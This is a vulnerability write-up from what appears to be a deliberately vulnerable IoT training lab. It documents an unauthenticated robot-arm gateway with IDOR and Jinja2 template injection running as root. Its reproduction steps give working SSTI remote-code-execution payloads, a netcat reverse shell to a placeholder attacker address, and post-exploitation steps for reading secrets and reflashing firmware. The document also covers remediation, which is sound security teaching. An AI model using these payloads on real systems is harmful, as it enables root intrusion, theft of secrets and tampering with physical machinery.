---
id: IoT:I3
title: "Insecure Ecosystem Interfaces"
category: IoT
status: DONE
severity: Critical
owasp: "IoT I3 - Insecure Ecosystem Interfaces"
cwe: "CWE-1336 (Server-Side Template Injection) / CWE-94 (Code Injection) / CWE-306 (Missing Authentication) / CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-79 (Cross-site Scripting)"
source_docs:
  - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §5, §7 (IoT:I3)"
  - "stages/01_spec/output/octobot-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/octobot/files/opt/octobot/octobot_gateway.py"
  - "labs/octobot/files/etc/init.d/octobot-gateway"
verified_date: "2026-08-03"
---

## Why It Matters

The web/REST HMI on `:8090` is the ecosystem interface between operators, the mobile app, and the arm. It exposes movement and admin functions with no authentication, lets the caller address any servo by index, and renders attacker-controlled input as a server-side template. A browser on the LAN can move the arm, and the `/admin` page is a Server-Side Template Injection sink.

The SSTI is the strongest single finding on the Pi. The gateway runs as a procd service with no `user` drop and no `ujail`, so `octobot_gateway.py` executes as **root**, and it binds `0.0.0.0:8090` with no authentication. Any host on the flat lab LAN therefore gets unauthenticated remote **root** code execution on the field gateway through a single GET request. Because the same root process co-hosts the firmware store (`/opt/octobot/firmware/robot_arm.hex`), `avrdude`, and the serial bus, one SSTI request chains directly into the firmware-replacement path of [IoT:I4](IoT4_Lack_of_Secure_Update_Mechanism.md) and the actuator-password disclosure of [IoT:I1](IoT1_Weak_Guessable_Hardcoded_Passwords.md) without any of their multi-step network paths.

## Root Cause

```python
# labs/octobot/files/opt/octobot/octobot_gateway.py
@app.route('/api/move')                     # [IoT:I3] no auth, [IoT:I8] no rate limit
def move():
    servo = request.args.get('servo', '0')  # [IoT:I3] IDOR: any servo index accepted
    angle = request.args.get('angle', '90')
    bus_send(f'S{servo}:{angle}')

@app.route('/admin')                        # [IoT:I3] SSTI/XSS: user input compiled as template
def admin():
    msg = request.args.get('msg', '')
    tmpl = ('<!doctype html><h1>OctoBot HMI - Cell 01</h1>'
            '<p>' + msg + '</p>' ...)
    return render_template_string(tmpl)
```

`/api/move` has no auth decorator and trusts the `servo` parameter as a direct index (IDOR). `/admin` concatenates the `msg` query parameter into a template string passed to `render_template_string`, so Jinja2 evaluates attacker input.

The impact is root because the gateway's procd service never drops privilege:

```sh
# labs/octobot/files/etc/init.d/octobot-gateway
start_service() {
	procd_open_instance
	procd_set_param command /usr/bin/python3 /opt/octobot/octobot_gateway.py
	...            # no procd_set_param user, no ujail: the instance runs as root
}
```

The Flask app then binds every interface with no TLS and no auth (`app.run(host='0.0.0.0', port=HTTP_PORT)`), so the SSTI sink is reachable unauthenticated from the whole LAN and its code runs with uid 0.

## Steps to Reproduce

```bash
# No-auth actuation
curl -s 'http://192.168.2.1:8090/api/move?servo=0&angle=10'
# -> {"ok": true, "sent": "S0:10"}

# IDOR: address any servo (e.g. the claw) by index
curl -s 'http://192.168.2.1:8090/api/move?servo=3&angle=5'

# SSTI: payload evaluated server-side
curl -s 'http://192.168.2.1:8090/admin?msg={{7*7}}'
# -> response contains <p>49</p>

# SSTI -> unauthenticated remote ROOT RCE via a Jinja2 gadget.
# The gateway runs as root, so the injected command runs as uid 0.
curl -s -G 'http://192.168.2.1:8090/admin' \
     --data-urlencode "msg={{ cycler.__init__.__globals__.os.popen('id').read() }}"
# -> response contains: uid=0(root) gid=0(root) ...

# Full shell: drop a reverse shell back to the attacker (root).
curl -s -G 'http://192.168.2.1:8090/admin' \
     --data-urlencode "msg={{ cycler.__init__.__globals__.os.popen('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f').read() }}"

# Chain from the root RCE, no separate exploit needed:
#  - read the actuator password (IoT:I1):    grep HARD_CODED_PASSWORD /opt/octobot/serial_bus.py
#  - replace the arm firmware (IoT:I4):       avrdude ... -U flash:w:/tmp/evil.hex  (avrdude is on the Pi)
#  - read every lab secret:                   uci show octobot   (api_key, admin_pass)
```

If the exact gadget differs on the installed Jinja2 build, any root-reachable global works (`cycler`, `joiner`, `lipsum.__globals__`, `request.application.__globals__`). The `{{7*7}} -> 49` probe confirms evaluation before you pick a gadget.

## Expected Result

`/api/move` actuates with no auth, any `servo` index is accepted, `/admin?msg={{7*7}}` returns `49` (template evaluation), and the `os.popen('id')` gadget returns `uid=0(root)`, confirming unauthenticated remote root code execution on the gateway. From that root shell the attacker reaches the firmware store, `avrdude`, the serial bus, and the UCI secrets on the same host.

## How It Should Be

Require authentication and per-action authorization on the REST API, validate `servo` against a fixed allow-list, and never build templates from user input. Render `msg` as data with autoescaping (a static template plus a context variable), not as template source.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Auth | Session/token on all `/api/*` and `/admin` | No anonymous control |
| Authz | Allow-list servo indices and angle ranges | Kill the IDOR |
| Output | Static template + autoescaped context var | Eliminate SSTI/XSS |
| Privilege | Run the gateway under a dedicated low-priv user + `ujail` | Contain the RCE blast radius, no uid-0 execution |

## Verification Checklist

- [ ] `GET /api/move` works with no credentials
- [ ] Arbitrary `servo` index is accepted (IDOR)
- [ ] `GET /admin?msg={{7*7}}` renders `49`
- [ ] The `os.popen('id')` SSTI gadget returns `uid=0(root)` (unauthenticated remote root RCE)
- [ ] `octobot-gateway` runs as root (no `procd_set_param user`, no `ujail` in the init script)
- [ ] From the RCE the actuator password, `avrdude`, and `uci show octobot` secrets are reachable on the same host

## Related Vulnerabilities

- [IoT:I4 — Lack of Secure Update Mechanism](IoT4_Lack_of_Secure_Update_Mechanism.md): the root RCE reaches `avrdude` and the firmware store directly, collapsing the firmware-replacement chain into one request.
- [IoT:I1 — Weak, Guessable, or Hardcoded Passwords](IoT1_Weak_Guessable_Hardcoded_Passwords.md): the same root shell reads `HARD_CODED_PASSWORD` from the overlay source with no leak vector needed.
- [IoT:I9 — Insecure Default Settings](IoT9_Insecure_Default_Settings.md): the gateway binding `0.0.0.0` as root with no auth is the default posture that makes this reachable.
